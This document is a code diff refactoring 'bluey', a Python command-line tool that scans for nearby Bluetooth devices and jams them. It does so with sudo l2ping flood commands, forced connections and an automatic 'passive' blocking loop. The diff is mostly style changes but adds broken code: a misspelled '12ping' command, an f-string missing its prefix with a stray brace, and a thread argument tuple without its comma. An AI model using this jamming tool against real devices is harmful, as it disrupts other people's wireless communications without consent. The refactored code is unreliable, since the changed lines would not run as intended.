@@ -4,7 +4,7 @@ import art
 import subprocess
 from alive_progress import alive_bar
 import time
-import threading
+from threading import Thread
 
 blocked_addr = []
 
@@ -12,6 +12,7 @@ art.tprint("bluey")
 print("=====================================")
 print("Author: Logan Goins\n")
 print("I am not responsible for any damages or misuse from this software.\nThis software is used at your own risk\n")
+
 
 def scan():
     try:
@@ -51,13 +52,9 @@ def force_connect(target):
             subprocess.call(connect)
             bar()
 
-def passive_prevent(target):
-
-    
-    if item in blocked_addr:
-        pass
-    else:
-        subprocess.call(["sudo l2ping -i ", interface, " -s ", packetsize, " -f " , target], stdout=open(os.devnull, 'wb'))
+def passive_prevent(target) -> None:
+    if item not in blocked_addr:
+        subprocess.check_output("sudo 12ping -i {interface} -s {packetsize} -f {target}}".split(" "))
 
 def passive_scan():
     try:
@@ -74,7 +71,7 @@ def passive_scan():
 
         os.system("clear")
 
-        threads = []
+        threads: list[Thread] = []
 
 
         while True:       
@@ -85,9 +82,8 @@ def passive_scan():
             for name, addr in nearby_devices:
                 print("Blocked devices:")
                 print (" > %s - %s" % (addr, name))
-                t = threading.Thread(target=passive_prevent, args=(addr))
-                t.start()
-                threads.append(t)
+                threads.append(Thread(target=passive_prevent, args=(addr)))  # Not sure how you want this to work, but you might want to call a .join() on all the threads to wait until they're all done.
+                threads[-1].start()
                 blocked_addr.append(addr)
 
             print(" \n")
@@ -112,8 +108,9 @@ def jam():
         main()
 
     print("Starting packet flow")
-    os.system("sudo l2ping -i " + interface + " -s " + packetsize + " -f " + target)
-    
+    os.system("sudo l2ping -i " + interface + " -s " + packetsize + " -f " + target)  # Does this need to be silenced?
+
+
 def help_menu():
     print(" \n")
     print("Commands")
@@ -126,6 +123,7 @@ def help_menu():
     print("set packetsize <packet size> ---  sets packet size for use with the \"jam\" command (in bytes)")
     print("clear  ---  clears terminal window")
     print(" ")
+
 
 def main():
     while True:
@@ -149,39 +147,39 @@ def main():
             params = [cmd]
 
 
-        if(cmd == "scan"):
+        if cmd == "scan":
             scan()
 
-        if(cmd == "set" and subcmd == "target"):
+        if cmd == "set" and subcmd == "target":
             global target
             target = arg
             print(target + " ---> target\n")
 
-        if(cmd == "jam"):
+        if cmd == "jam":
             jam()
 
-        if(cmd == "set" and subcmd == "packetsize"):
+        if cmd == "set" and subcmd == "packetsize":
             global packetsize
             packetsize = arg
             print(packetsize + " ---> packet size\n")
 
-        if(cmd == "set" and subcmd == "interface"):
+        if cmd == "set" and subcmd == "interface" :
             global interface
             interface = arg
             print(interface + " ---> bluetooth interface\n")
 
-        if(cmd == "forceconnect"):
+        if cmd == "forceconnect":
             force_connect(target)
 
-        if(cmd == "help"):
+        if cmd == "help":
             help_menu()
         
-        if(cmd == "clear"):
+        if cmd == "clear":
             os.system("clear")
 
-        if(cmd == "exit" or cmd == "quit"):
+        if cmd == "exit" or cmd == "quit":
             exit()
 
 
-main()
-
+if __name__ == "__main__":
+    main()
